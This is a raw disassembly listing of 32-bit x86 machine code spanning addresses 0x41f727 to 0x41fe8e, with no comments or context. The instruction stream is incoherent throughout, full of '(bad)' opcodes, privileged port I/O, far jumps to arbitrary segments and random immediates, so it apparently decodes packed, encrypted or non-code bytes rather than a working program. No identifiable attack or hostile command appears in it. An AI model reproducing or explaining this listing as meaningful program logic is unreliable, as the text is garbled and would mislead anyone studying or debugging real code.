  41f727:	sub    eax,0xeea46298
  41f72c:	or     edx,esi
  41f72e:	and    ah,BYTE PTR [ebx-0x787e4f7d]
  41f734:	(bad)  
  41f735:	jmp    0x41f6c1
  41f737:	mov    ds:0x7cad0668,al
  41f73c:	cmp    al,0xb4
  41f73e:	sbb    al,0x29
  41f740:	cmp    DWORD PTR [esi+0x24],eax
  41f743:	mov    bl,0x70
  41f745:	les    eax,FWORD PTR [ebx+0x15]
  41f748:	mov    ds:0xb856e16c,eax
  41f74d:	jmp    0xe12a0f8e
  41f752:	fld    QWORD PTR [edx-0x1a8c317b]
  41f758:	adc    BYTE PTR [esi+0x43],ah
  41f75b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f75c:	jle    0x41f7bc
  41f75e:	int    0x8d
  41f760:	jp     0x41f715
  41f762:	and    DWORD PTR [edi-0x36],0xffffffe2
  41f766:	inc    eax
  41f767:	mov    esp,0xe43ee57c
  41f76c:	cs pusha 
  41f76e:	fs add bl,ch
  41f771:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f772:	jae    0x41f735
  41f774:	add    eax,0x9593fd93
  41f779:	ss aaa 
  41f77b:	fadd   QWORD PTR [eax]
  41f77d:	aaa    
  41f77e:	out    dx,eax
  41f77f:	sub    edi,DWORD PTR [edi-0x4e115ed9]
  41f785:	and    DWORD PTR [esp+ecx*2],edx
  41f788:	mov    bl,0xba
  41f78a:	mov    ?,WORD PTR [esi-0x48]
  41f78d:	pop    es
  41f78e:	dec    edi
  41f78f:	sub    al,0xe0
  41f791:	loopne 0x41f75d
  41f793:	adc    BYTE PTR [ebp+0x76bee8e7],bh
  41f799:	pop    ds
  41f79a:	mov    bl,0x3b
  41f79c:	sub    DWORD PTR [ebx+edx*2-0x37b39749],0xffffff80
  41f7a4:	(bad)  
  41f7a5:	iret   
  41f7a6:	inc    ebx
  41f7a7:	stos   BYTE PTR es:[edi],al
  41f7a8:	mov    WORD PTR [esi],ds
  41f7aa:	inc    ebx
  41f7ab:	clc    
  41f7ac:	or     al,0x70
  41f7ae:	pop    esp
  41f7af:	sbb    eax,0x4a5e9714
  41f7b4:	fcom   QWORD PTR [ecx+0x1c4a96f2]
  41f7ba:	and    DWORD PTR [esi+0x5a774d53],esp
  41f7c0:	xor    BYTE PTR [edi+0x12],ch
  41f7c3:	xchg   DWORD PTR ds:0x3dbac105,esp
  41f7c9:	loopne 0x41f7c7
  41f7cb:	ins    BYTE PTR es:[edi],dx
  41f7cc:	jmp    0xb4dd:0x512ed414
  41f7d3:	push   edi
  41f7d4:	cmp    al,0x9f
  41f7d6:	mov    eax,0x5eab8cfa
  41f7db:	mov    al,ds:0x6649c2c6
  41f7e0:	leave  
  41f7e1:	inc    eax
  41f7e2:	cdq    
  41f7e3:	jl     0x41f818
  41f7e5:	pop    ds
  41f7e6:	dec    ebp
  41f7e7:	sub    BYTE PTR [edi+0x66],0x6a
  41f7eb:	dec    esi
  41f7ec:	shl    BYTE PTR [eax+0x1e4db39a],1
  41f7f2:	mov    al,ds:0x7bc76ed6
  41f7f7:	fst    DWORD PTR [esi]
  41f7f9:	xchg   DWORD PTR [ebx],ecx
  41f7fb:	push   ss
  41f7fc:	push   cs
  41f7fd:	in     eax,dx
  41f7fe:	sahf   
  41f7ff:	sbb    DWORD PTR [edi],eax
  41f801:	jo     0x41f7a2
  41f803:	aam    0x28
  41f805:	pop    edi
  41f806:	es adc eax,0x63e2f5d4
  41f80c:	xor    esi,DWORD PTR [esi+0x1f7c601f]
  41f812:	retf   
  41f813:	and    eax,0x448aba58
  41f818:	push   es
  41f819:	mov    edi,0x17bbaf43
  41f81e:	jle    0x41f813
  41f820:	ja     0x41f891
  41f822:	loope  0x41f7a6
  41f824:	adc    DWORD PTR [edi+eax*4],0x7e
  41f828:	push   ecx
  41f829:	xchg   edi,eax
  41f82a:	notrack jmp DWORD PTR [eax+0x98eb7ac]
  41f831:	ficom  WORD PTR [edx+0x121f0a2f]
  41f837:	and    ah,BYTE PTR [edi]
  41f839:	out    dx,al
  41f83a:	add    DWORD PTR [edi+0xb],ebp
  41f83d:	xchg   BYTE PTR [ebp+0x9a8d0db],bl
  41f843:	aad    0x5f
  41f845:	push   ebx
  41f846:	outs   dx,BYTE PTR ds:[esi]
  41f847:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f848:	xchg   edx,eax
  41f849:	stc    
  41f84a:	shl    BYTE PTR [edx-0x26af216d],cl
  41f850:	test   eax,0xa071c9ab
  41f855:	inc    esi
  41f856:	rcl    DWORD PTR [eax],0xad
  41f859:	loope  0x41f85b
  41f85b:	hlt    
  41f85c:	test   BYTE PTR [eax+0x543ebf2d],bl
  41f862:	inc    edx
  41f863:	int    0xf2
  41f865:	dec    ebp
  41f866:	(bad)  
  41f867:	ins    BYTE PTR es:[edi],dx
  41f868:	imul   eax,DWORD PTR [eax+0x25],0x79
  41f86c:	jp     0x41f862
  41f86e:	dec    edx
  41f86f:	(bad)  
  41f872:	out    0x46,al
  41f874:	xor    DWORD PTR [esi+0xd],0xbf5d118
  41f87b:	jmp    0x24f8:0x5d575b7e
  41f882:	ins    DWORD PTR es:[edi],dx
  41f883:	xor    cl,bl
  41f885:	push   cs
  41f886:	cmp    edx,0xef46ffc1
  41f88c:	pop    ebx
  41f88d:	leave  
  41f88e:	push   esi
  41f88f:	sbb    al,0x43
  41f891:	jecxz  0x41f884
  41f893:	inc    eax
  41f894:	cdq    
  41f895:	ja     0x41f834
  41f897:	icebp  
  41f898:	pop    es
  41f899:	push   0x2ac31344
  41f89e:	out    dx,eax
  41f89f:	imul   DWORD PTR [ebx+0x48c40486]
  41f8a5:	mov    BYTE PTR [ebx-0x349f0ec6],al
  41f8ab:	sbb    eax,0x2e78d43e
  41f8b0:	mov    eax,0x576a6f17
  41f8b5:	cwde   
  41f8b6:	xchg   ebx,eax
  41f8b7:	test   BYTE PTR [ebx],cl
  41f8b9:	sti    
  41f8ba:	jb     0x41f8b7
  41f8bc:	stos   BYTE PTR es:[edi],al
  41f8bd:	das    
  41f8be:	pusha  
  41f8bf:	dec    esp
  41f8c0:	(bad)  
  41f8c1:	push   0xbecf761
  41f8c6:	dec    ecx
  41f8c7:	push   esi
  41f8c8:	push   esi
  41f8c9:	sub    eax,0xffffff8b
  41f8cc:	gs mov esp,0xd8d552c8
  41f8d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f8d3:	rcr    DWORD PTR [edx],cl
  41f8d5:	std    
  41f8d6:	xor    eax,0x8e3dc1fe
  41f8db:	adc    BYTE PTR [ecx],cl
  41f8dd:	inc    esp
  41f8de:	sub    BYTE PTR [ecx],cl
  41f8e0:	push   es
  41f8e1:	call   0x950d:0x1f2e7fd8
  41f8e8:	push   0xffffff94
  41f8ea:	mov    dh,0xd5
  41f8ec:	push   DWORD PTR [ecx+0x6a]
  41f8ef:	stos   DWORD PTR es:[edi],eax
  41f8f0:	(bad)  
  41f8f1:	daa    
  41f8f2:	fisub  WORD PTR [ebx]
  41f8f4:	out    dx,eax
  41f8f5:	pop    ds
  41f8f6:	push   0xf4ab6fd7
  41f8fb:	and    ebp,ebx
  41f8fd:	popa   
  41f8fe:	jbe    0x41f8de
  41f900:	xor    cl,BYTE PTR [eax-0x3b]
  41f903:	fs iret 
  41f905:	imul   edi,DWORD PTR [ecx+0x60],0x5d
  41f909:	mov    eax,ds:0x2593c669
  41f90e:	fnstcw WORD PTR [ecx-0x1c]
  41f911:	jle    0x41f950
  41f913:	fcmovb st,st(3)
  41f915:	mov    DWORD PTR [esi-0x36b65598],ecx
  41f91b:	xchg   BYTE PTR [edi+0x31],dh
  41f91e:	mul    BYTE PTR [esi+0x1f]
  41f921:	cmp    BYTE PTR [ebx+0x1e],0xc0
  41f925:	iret   
  41f926:	gs jae 0x41f8ce
  41f929:	push   edx
  41f92a:	xchg   ebx,eax
  41f92b:	ret    0xd2b8
  41f92e:	xor    eax,0x323b370f
  41f933:	xchg   DWORD PTR [esi-0x5e098cde],edi
  41f939:	test   eax,0x474e752f
  41f93e:	clc    
  41f93f:	mov    bl,0x34
  41f941:	cdq    
  41f942:	and    BYTE PTR [ecx],ah
  41f944:	loopne 0x41f9c5
  41f946:	nop
  41f947:	das    
  41f948:	sub    DWORD PTR [esp+edx*2],edi
  41f94b:	ins    WORD PTR es:[edi],dx
  41f94d:	call   FWORD PTR [eax-0x3a]
  41f950:	jo     0x41f97a
  41f952:	aaa    
  41f953:	iret   
  41f954:	xchg   edx,eax
  41f955:	and    eax,0x7709296
  41f95a:	out    dx,al
  41f95b:	dec    DWORD PTR [ebp+0x77]
  41f95e:	jecxz  0x41f97e
  41f960:	push   es
  41f961:	sbb    eax,0xaec38af1
  41f966:	xchg   edx,eax
  41f967:	ins    DWORD PTR es:[edi],dx
  41f968:	arpl   WORD PTR [esp+ebx*8+0x5f9859ad],bp
  41f96f:	jg     0x41f922
  41f971:	inc    eax
  41f972:	(bad)  
  41f973:	(bad)  
  41f975:	xor    eax,DWORD PTR ds:0xa1ad1eb6
  41f97b:	nop
  41f97c:	jp     0x41f9e3
  41f97e:	push   edx
  41f97f:	in     eax,0x92
  41f981:	xor    ebp,DWORD PTR [edx]
  41f983:	sbb    DWORD PTR [esi+0x19115dad],ecx
  41f989:	scas   al,BYTE PTR es:[edi]
  41f98a:	enter  0x1a39,0x6e
  41f98e:	xor    ah,bl
  41f990:	fistp  DWORD PTR [ebx]
  41f992:	or     BYTE PTR [ebp+0x4068e12d],0xe2
  41f999:	push   es
  41f99a:	jg     0x41f9ac
  41f99c:	pop    ds
  41f99d:	pop    ebp
  41f99e:	mov    ch,0xeb
  41f9a0:	out    0xd0,al
  41f9a2:	rol    ecx,1
  41f9a4:	rcl    BYTE PTR [esi],1
  41f9a6:	or     esi,DWORD PTR [edi+eiz*4]
  41f9a9:	icebp  
  41f9aa:	mov    ah,0x8a
  41f9ac:	imul   edx,DWORD PTR [edi+0x3f14fdd5],0x16
  41f9b3:	gs daa 
  41f9b5:	mov    eax,0xb0930ffe
  41f9ba:	xor    BYTE PTR [ebx+0x15],bl
  41f9bd:	jg     0x41f94c
  41f9bf:	sar    DWORD PTR [edi],1
  41f9c1:	mov    ch,0xb
  41f9c3:	xchg   ebp,eax
  41f9c4:	popf   
  41f9c5:	and    DWORD PTR [esi-0x2c5fc19e],0xb517ec80
  41f9cf:	repz jmp 0x41f95e
  41f9d2:	pusha  
  41f9d3:	push   ss
  41f9d4:	cmp    ebx,DWORD PTR [ebx]
  41f9d6:	out    dx,eax
  41f9d7:	lods   eax,DWORD PTR ds:[esi]
  41f9d8:	mov    eax,fs:0x9cf60911
  41f9de:	loopne 0x41f9e7
  41f9e0:	scas   al,BYTE PTR es:[edi]
  41f9e1:	enter  0x397e,0x60
  41f9e5:	cmp    al,0x8
  41f9e7:	(bad)  [esi-0x35]
  41f9ea:	mov    BYTE PTR [ebx+0x1e],al
  41f9ed:	in     eax,dx
  41f9ee:	push   ss
  41f9ef:	cmp    esp,0x14
  41f9f2:	and    BYTE PTR [edi+ebx*2+0x22],0xa3
  41f9f7:	fs inc edx
  41f9f9:	cmp    eax,0xdcb60caa
  41f9fe:	mov    ch,BYTE PTR [ebp+0x5adfc9e7]
  41fa04:	jl     0x41fa07
  41fa06:	in     al,0xd0
  41fa08:	(bad)  
  41fa0a:	inc    eax
  41fa0b:	sbb    BYTE PTR [edx-0x77715f58],0x73
  41fa12:	das    
  41fa13:	aaa    
  41fa14:	repnz sub bl,cl
  41fa17:	je     0x41fa84
  41fa19:	inc    esi
  41fa1a:	dec    ebx
  41fa1b:	loope  0x41f9ab
  41fa1d:	sbb    al,dl
  41fa1f:	gs daa 
  41fa21:	fucomp st(1)
  41fa23:	mov    al,ds:0x79c9ddbd
  41fa28:	mov    eax,ds:0x1a4e9192
  41fa2d:	xor    esp,DWORD PTR ds:0x9274ef75
  41fa33:	inc    ecx
  41fa34:	jle    0x41f9de
  41fa36:	lahf   
  41fa37:	shl    BYTE PTR [ecx+0x7b],0xda
  41fa3b:	pop    eax
  41fa3c:	ds mov dl,0x28
  41fa3f:	lea    esi,[ebp+0x53]
  41fa42:	out    0x77,al
  41fa44:	and    al,BYTE PTR [eax+0x34]
  41fa47:	fistp  DWORD PTR [edi]
  41fa49:	sub    BYTE PTR [edi-0x391a5ea5],ch
  41fa4f:	ret    0xc3b6
  41fa52:	cmc    
  41fa53:	scas   al,BYTE PTR es:[edi]
  41fa54:	add    DWORD PTR [ecx+0x2c],esp
  41fa57:	out    0x78,al
  41fa59:	or     ah,BYTE PTR [ecx+0x60ed5db]
  41fa5f:	pop    esi
  41fa60:	in     eax,0xed
  41fa62:	jne    0x41fad9
  41fa64:	jno    0x41fa35
  41fa66:	repnz push 0x8205f601
  41fa6c:	cmp    BYTE PTR [edx],dl
  41fa6e:	repz mov dh,0x6f
  41fa71:	or     BYTE PTR [ebx+0x6a4f266],dh
  41fa77:	adc    edi,DWORD PTR [edi-0x57]
  41fa7a:	fiadd  WORD PTR [eax]
  41fa7c:	out    0x8b,eax
  41fa7e:	pop    ss
  41fa7f:	sub    bh,cl
  41fa81:	sbb    bh,BYTE PTR [eax+0x61]
  41fa84:	and    ebx,DWORD PTR [eax]
  41fa86:	ja     0x41faa2
  41fa88:	mov    ds:0xec57115f,eax
  41fa8d:	pop    ebp
  41fa8e:	js     0x41fa86
  41fa90:	nop
  41fa91:	and    dl,0x56
  41fa94:	xchg   edx,eax
  41fa95:	daa    
  41fa96:	shl    DWORD PTR ds:0xdf9d9180,1
  41fa9c:	and    cl,BYTE PTR [edx-0x19513f67]
  41faa2:	cld    
  41faa3:	lock adc al,0xa5
  41faa6:	sbb    DWORD PTR [edx+eiz*8+0x3e],esi
  41faaa:	sti    
  41faab:	imul   esp,DWORD PTR [ebx-0x6de884f1],0xaafd468f
  41fab5:	or     eax,0x8980da7f
  41faba:	mov    ebp,0x2a9a93b6
  41fabf:	fwait
  41fac0:	jns    0x41fa7d
  41fac2:	outs   dx,DWORD PTR ds:[esi]
  41fac3:	lods   eax,DWORD PTR ds:[esi]
  41fac4:	fisub  WORD PTR [ebp+0x4a]
  41fac7:	adc    eax,0x9f6a429c
  41facc:	sbb    ebx,esi
  41face:	dec    edx
  41facf:	stos   DWORD PTR es:[edi],eax
  41fad0:	jns    0x41fb09
  41fad2:	es pop ds
  41fad4:	dec    ebp
  41fad5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fad6:	dec    eax
  41fad7:	inc    ecx
  41fad8:	mov    edi,0xd822be8c
  41fadd:	push   es
  41fade:	(bad)  
  41fadf:	push   cs
  41fae0:	push   eax
  41fae1:	fld    DWORD PTR [edx-0x20a026d]
  41fae7:	push   cs
  41fae8:	adc    dh,bl
  41faea:	inc    edx
  41faeb:	data16 fcmovnb st,st(1)
  41faee:	push   esi
  41faef:	mov    bh,0xfb
  41faf1:	popa   
  41faf2:	xchg   ecx,eax
  41faf3:	faddp  st(5),st
  41faf6:	mov    ds:0x97242e12,eax
  41fafb:	cmp    bh,BYTE PTR [edx-0x25]
  41fafe:	(bad)  
  41faff:	and    eax,0x8a81a239
  41fb04:	add    BYTE PTR [eax-0x1b],ah
  41fb07:	outs   dx,DWORD PTR ds:[esi]
  41fb08:	sub    ah,dl
  41fb0a:	push   0xa9239d77
  41fb0f:	sbb    eax,0x4bb5cfaf
  41fb14:	cmp    al,0x38
  41fb16:	add    bl,BYTE PTR [esi]
  41fb18:	mov    ah,0x99
  41fb1a:	pusha  
  41fb1b:	out    dx,eax
  41fb1c:	mov    esp,0x2d1623d5
  41fb21:	lods   eax,DWORD PTR ds:[esi]
  41fb22:	or     BYTE PTR [eax+0x2],ch
  41fb25:	out    0xcb,eax
  41fb27:	ficom  DWORD PTR [edx]
  41fb29:	popa   
  41fb2a:	mov    esp,0x54d97d78
  41fb2f:	xchg   ecx,eax
  41fb30:	js     0x41face
  41fb32:	cmp    eax,0x99951588
  41fb37:	jns    0x41faf0
  41fb39:	out    dx,al
  41fb3a:	out    dx,al
  41fb3b:	inc    ebx
  41fb3c:	aam    0xa0
  41fb3e:	inc    ebx
  41fb3f:	and    ebx,DWORD PTR [ebp+eiz*4-0x5d]
  41fb43:	jns    0x41fba8
  41fb45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fb46:	sub    al,BYTE PTR [esi]
  41fb48:	jno    0x41fb6b
  41fb4a:	jb     0x41fba0
  41fb4c:	sub    esp,eax
  41fb4e:	cli    
  41fb4f:	jecxz  0x41faff
  41fb51:	(bad)  
  41fb52:	inc    edx
  41fb53:	loop   0x41fb11
  41fb55:	in     al,dx
  41fb56:	mov    bh,0x64
  41fb58:	mov    ds:0x2296f6db,eax
  41fb5d:	mov    ebp,0x8c635431
  41fb62:	test   al,0x3a
  41fb64:	enter  0x339b,0x2e
  41fb68:	fld    QWORD PTR [eax]
  41fb6a:	inc    esp
  41fb6b:	mov    ebx,0x4ace261d
  41fb70:	push   cs
  41fb71:	mov    ecx,0x528b95e4
  41fb76:	es stos BYTE PTR es:[di],al
  41fb79:	add    DWORD PTR gs:[edi+0x36],eax
  41fb7d:	jae    0x41fb94
  41fb7f:	std    
  41fb80:	mov    al,ds:0x9525e172
  41fb85:	mov    BYTE PTR [ecx],dl
  41fb87:	add    edx,0xfffffff8
  41fb8a:	js     0x41fbf2
  41fb8c:	push   es
  41fb8d:	pop    esi
  41fb8e:	jmp    0x7529:0x756a289a
  41fb95:	mov    esp,0x371d94e5
  41fb9a:	ret    
  41fb9b:	add    ch,bh
  41fb9d:	dec    esp
  41fb9e:	lds    esp,FWORD PTR [ecx+ebx*4]
  41fba1:	xchg   DWORD PTR [ebx],edi
  41fba3:	adc    dh,BYTE PTR ds:0xb6161295
  41fba9:	or     eax,0x20cc043b
  41fbae:	(bad)  
  41fbaf:	fwait
  41fbb0:	xor    DWORD PTR [esi],ecx
  41fbb2:	stos   BYTE PTR es:[edi],al
  41fbb3:	into   
  41fbb4:	mov    ecx,0x981180e9
  41fbb9:	adc    BYTE PTR [ebx-0x4b],cl
  41fbbc:	(bad)  
  41fbbd:	(bad)  
  41fbbe:	fst    QWORD PTR [ecx+eiz*1+0x6ae9d89f]
  41fbc5:	fs jbe 0x41fb87
  41fbc8:	in     al,dx
  41fbc9:	arpl   di,ax
  41fbcb:	dec    eax
  41fbcc:	mov    ebx,0x2c335930
  41fbd1:	xchg   ecx,eax
  41fbd2:	int3   
  41fbd3:	xchg   ebp,eax
  41fbd4:	das    
  41fbd5:	xchg   edi,eax
  41fbd6:	jge    0x41fc46
  41fbd8:	mov    ch,0xad
  41fbda:	push   edx
  41fbdb:	les    ecx,FWORD PTR [edi-0x1dc193b7]
  41fbe1:	jg     0x41fbff
  41fbe3:	fdiv   QWORD PTR [edi+0x63]
  41fbe6:	repnz pop es
  41fbe8:	imul   esp,DWORD PTR [eax+0x73b8ca26],0x42
  41fbef:	and    bh,BYTE PTR [eax+0x34e4245f]
  41fbf5:	push   cs
  41fbf6:	mov    ebx,0x8e8308b4
  41fbfb:	xlat   BYTE PTR ds:[ebx]
  41fbfc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fbfd:	push   edi
  41fbfe:	leave  
  41fbff:	ficomp DWORD PTR [esi-0x10]
  41fc02:	inc    esp
  41fc03:	inc    esi
  41fc04:	add    DWORD PTR [ecx-0x48],edx
  41fc07:	test   al,0xf8
  41fc09:	stos   BYTE PTR es:[edi],al
  41fc0a:	xor    BYTE PTR [eax],dh
  41fc0c:	mov    esi,0xa6c880df
  41fc11:	scas   eax,DWORD PTR es:[edi]
  41fc12:	fdiv   DWORD PTR [esp+edx*8]
  41fc15:	jecxz  0x41fc77
  41fc17:	mov    esp,0xf45e468b
  41fc1c:	mov    al,ds:0x7f6aff6f
  41fc21:	xlat   BYTE PTR ds:[ebx]
  41fc22:	call   0x7d153099
  41fc27:	xchg   ecx,eax
  41fc28:	scas   eax,DWORD PTR es:[edi]
  41fc29:	mov    ds:0xf4a60a25,al
  41fc2e:	loop   0x41fc79
  41fc30:	and    ecx,DWORD PTR [esi-0x65479c65]
  41fc36:	shl    DWORD PTR [edi*8+0x7d0c22f9],1
  41fc3d:	push   ebx
  41fc3e:	xor    al,0x52
  41fc40:	mov    WORD PTR [esi],ss
  41fc42:	out    0x42,eax
  41fc44:	mov    ds:0x2d750a10,eax
  41fc49:	inc    ebx
  41fc4a:	inc    ebp
  41fc4b:	mov    ebp,0xf1d3e403
  41fc50:	ins    DWORD PTR es:[edi],dx
  41fc51:	sahf   
  41fc52:	not    DWORD PTR [esi+esi*4-0x7e]
  41fc56:	out    0xe5,al
  41fc58:	out    dx,eax
  41fc59:	pop    esp
  41fc5a:	mov    ebx,0xb91d2bc8
  41fc5f:	xchg   edi,eax
  41fc60:	sub    bl,dl
  41fc62:	or     DWORD PTR [edi],esi
  41fc64:	adc    al,0x38
  41fc66:	mov    al,0x7
  41fc68:	pop    ebx
  41fc69:	test   BYTE PTR ds:0xe580f2b,bl
  41fc6f:	jmp    0xf246:0xdda3f499
  41fc76:	leave  
  41fc77:	fwait
  41fc78:	cmp    bh,bh
  41fc7a:	outs   dx,DWORD PTR ds:[esi]
  41fc7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fc7c:	icebp  
  41fc7d:	push   cs
  41fc7e:	fnstsw WORD PTR [ebx+0x2a5f9e77]
  41fc84:	or     ah,BYTE PTR [esi+0x32]
  41fc87:	cmc    
  41fc88:	test   BYTE PTR [edi],bl
  41fc8a:	and    eax,0xb157c52b
  41fc8f:	mov    bl,0x41
  41fc91:	test   al,0x5a
  41fc93:	js     0x41fc64
  41fc95:	mov    ch,0xe9
  41fc97:	pop    eax
  41fc98:	clc    
  41fc99:	cmc    
  41fc9a:	xlat   BYTE PTR ds:[ebx]
  41fc9b:	dec    edi
  41fc9c:	xor    BYTE PTR [ebx+0xdd995f4],ch
  41fca2:	and    esp,DWORD PTR [ebx-0x1774b3a1]
  41fca8:	add    BYTE PTR [ecx],dl
  41fcaa:	adc    eax,0xe94cc63e
  41fcaf:	sbb    ebx,DWORD PTR [edx-0x1ecbc6ab]
  41fcb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fcb6:	xchg   esi,eax
  41fcb7:	in     al,dx
  41fcb8:	dec    esp
  41fcb9:	ins    BYTE PTR es:[edi],dx
  41fcba:	pop    ds
  41fcbb:	jmp    0xccc25e04
  41fcc0:	int3   
  41fcc1:	xor    BYTE PTR [edi+0x6ec6cb],bh
  41fcc7:	sub    ah,BYTE PTR [ecx]
  41fcc9:	inc    esi
  41fcca:	or     eax,0x54d1393
  41fccf:	out    dx,al
  41fcd0:	loop   0x41fd04
  41fcd2:	mov    BYTE PTR [ebp+ecx*1-0x689f0934],ah
  41fcd9:	outs   dx,DWORD PTR ds:[esi]
  41fcda:	popa   
  41fcdb:	xor    bh,dl
  41fcdd:	aad    0x17
  41fcdf:	push   0x29c95050
  41fce4:	or     ch,cl
  41fce6:	outs   dx,DWORD PTR ds:[esi]
  41fce7:	mov    ebp,DWORD PTR [ebx-0xe]
  41fcea:	call   0xa57:0xa9cbc25
  41fcf1:	adc    al,0x2a
  41fcf3:	push   eax
  41fcf4:	int3   
  41fcf5:	test   cl,0x3b
  41fcf8:	sub    ebp,eax
  41fcfa:	xchg   edi,eax
  41fcfb:	add    ecx,DWORD PTR [ebx+ecx*8+0x69]
  41fcff:	mov    BYTE PTR [eax+ebx*2+0x2a01c656],cl
  41fd06:	sub    esi,ebx
  41fd08:	adc    DWORD PTR [ebx-0x31],ecx
  41fd0b:	imul   edx,DWORD PTR [eax+0x1ae97f3c],0x9fd8bacf
  41fd15:	scas   eax,DWORD PTR es:[edi]
  41fd16:	jns    0x41fd92
  41fd18:	pop    ds
  41fd19:	mov    ecx,0xc96d2175
  41fd1e:	sbb    BYTE PTR [ebp+0x36],0xc7
  41fd22:	adc    bh,bh
  41fd24:	icebp  
  41fd25:	sub    ecx,DWORD PTR [ebx+ebp*2-0x33]
  41fd29:	pop    edi
  41fd2a:	int3   
  41fd2b:	jo     0x41fcd7
  41fd2d:	fstp   DWORD PTR [edx]
  41fd2f:	push   edx
  41fd30:	imul   edx,DWORD PTR [ecx-0x36b88e19],0xffffffd3
  41fd37:	in     al,dx
  41fd38:	xor    ecx,DWORD PTR [edx]
  41fd3a:	in     eax,dx
  41fd3b:	cmp    ah,BYTE PTR [ebp+0x7a]
  41fd3e:	arpl   WORD PTR ds:0x36ae2d0e,di
  41fd44:	aam    0xe5
  41fd46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fd47:	push   ecx
  41fd48:	dec    eax
  41fd49:	fdivr  DWORD PTR [edx+ebx*8-0x28d79064]
  41fd50:	mov    esp,0xe6c83072
  41fd55:	sar    BYTE PTR [eax+0x5290a920],cl
  41fd5b:	pop    es
  41fd5c:	dec    edi
  41fd5d:	lods   al,BYTE PTR ds:[esi]
  41fd5e:	out    dx,eax
  41fd5f:	scas   al,BYTE PTR es:[edi]
  41fd60:	cld    
  41fd61:	jecxz  0x41fd5f
  41fd63:	cmp    esi,DWORD PTR [ebx]
  41fd65:	inc    eax
  41fd66:	push   ebx
  41fd67:	mov    ecx,0xdc0ca457
  41fd6c:	and    bh,cl
  41fd6e:	popf   
  41fd6f:	sub    ebp,DWORD PTR [eax+0x6b81bb6d]
  41fd75:	icebp  
  41fd76:	call   0x7c94:0x504c2a7d
  41fd7d:	mov    ebx,0xe4b98c8f
  41fd82:	das    
  41fd83:	mov    ch,0xbf
  41fd85:	sub    al,0xbb
  41fd87:	sti    
  41fd88:	int3   
  41fd89:	sbb    BYTE PTR [eax],dl
  41fd8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fd8c:	test   al,0x33
  41fd8e:	dec    esp
  41fd8f:	ficomp DWORD PTR [ecx-0x5c29b94d]
  41fd95:	in     eax,0x9b
  41fd97:	retf   0xdb66
  41fd9a:	leave  
  41fd9b:	xchg   DWORD PTR [ebp+0x702e18c6],edi
  41fda1:	dec    eax
  41fda2:	inc    esp
  41fda3:	dec    edx
  41fda4:	push   edi
  41fda5:	dec    ebp
  41fda6:	(bad)  
  41fda8:	inc    BYTE PTR [esi+0x1a]
  41fdab:	js     0x41fd78
  41fdad:	mov    esi,0x71ca55dd
  41fdb2:	xor    ecx,DWORD PTR ds:0xe2886321
  41fdb8:	inc    ebx
  41fdb9:	bound  ebx,QWORD PTR [ecx]
  41fdbb:	sub    dl,BYTE PTR [ecx+0x1bb4ce3b]
  41fdc1:	jg     0x41fd76
  41fdc3:	mov    BYTE PTR [edx-0x6b],cl
  41fdc6:	leave  
  41fdc7:	dec    eax
  41fdc8:	in     eax,0xe4
  41fdca:	jae    0x41fd52
  41fdcc:	sahf   
  41fdcd:	jp     0x41fdf2
  41fdcf:	adc    esi,DWORD PTR [ecx]
  41fdd1:	test   BYTE PTR [ebp+0x38],ah
  41fdd4:	fst    st(7)
  41fdd6:	loopne 0x41fe15
  41fdd8:	ror    BYTE PTR [ebx],cl
  41fdda:	push   esi
  41fddb:	cmp    ah,BYTE PTR [ebx+0x65]
  41fdde:	out    dx,eax
  41fddf:	hlt    
  41fde0:	or     eax,0x712769d2
  41fde6:	fimul  DWORD PTR [esp+esi*2-0x4b56d640]
  41fded:	jb     0x41fd76
  41fdef:	pop    edx
  41fdf0:	out    0x7f,eax
  41fdf2:	push   ss
  41fdf3:	arpl   WORD PTR [ebx+0x405b5b19],di
  41fdf9:	push   0x9546fcc
  41fdfe:	rol    dl,1
  41fe00:	aad    0x33
  41fe02:	or     eax,0x8053b61f
  41fe07:	pop    esi
  41fe08:	add    DWORD PTR [edi-0x30],eax
  41fe0b:	mov    bh,0x83
  41fe0d:	sti    
  41fe0e:	rcr    DWORD PTR [ebx+0x31],0x54
  41fe12:	ds push eax
  41fe14:	cdq    
  41fe15:	cld    
  41fe16:	(bad)  
  41fe17:	mov    esi,0xdc19ccbb
  41fe1c:	or     ah,dl
  41fe1e:	push   edi
  41fe1f:	jnp    0x41fe7e
  41fe21:	xor    BYTE PTR [ebx+0x35],cl
  41fe24:	inc    edx
  41fe25:	push   esp
  41fe26:	pop    ss
  41fe27:	rcr    BYTE PTR [edi],0xa8
  41fe2a:	cmp    cl,BYTE PTR [edx-0x1e79fbfc]
  41fe30:	enter  0x2783,0x5f
  41fe34:	mov    eax,0x34d13c77
  41fe39:	or     al,dh
  41fe3b:	xor    al,0x5d
  41fe3d:	xchg   edx,eax
  41fe3e:	jmp    0x961d:0xe2bb5208
  41fe45:	pop    esp
  41fe46:	mov    ebx,0xb1022801
  41fe4b:	cmp    eax,0xba93e6d3
  41fe50:	pop    ecx
  41fe51:	push   ds
  41fe52:	es ss fs int3 
  41fe56:	mov    ah,al
  41fe58:	retf   
  41fe59:	cmc    
  41fe5a:	or     al,0xa
  41fe5c:	aaa    
  41fe5d:	jmp    0x31fadfd9
  41fe62:	repz (bad) 
  41fe65:	push   ds
  41fe66:	test   eax,esp
  41fe68:	adc    ebx,ebp
  41fe6a:	hlt    
  41fe6b:	pushf  
  41fe6c:	pop    ss
  41fe6d:	or     esp,DWORD PTR [edi-0x3d84a3a4]
  41fe73:	fld1   
  41fe75:	cwde   
  41fe76:	loope  0x41fe62
  41fe78:	jp     0x41fe89
  41fe7a:	pop    edx
  41fe7b:	mov    BYTE PTR [eax-0x4a],ch
  41fe7e:	cdq    
  41fe7f:	mov    ebx,0xfdd4e26c
  41fe84:	and    al,0x44
  41fe86:	mov    esi,DWORD PTR [ebx-0x71dfd5ba]
  41fe8c:	into   
  41fe8d:	push   esi
  41fe8e:	mov    ah,0x7c
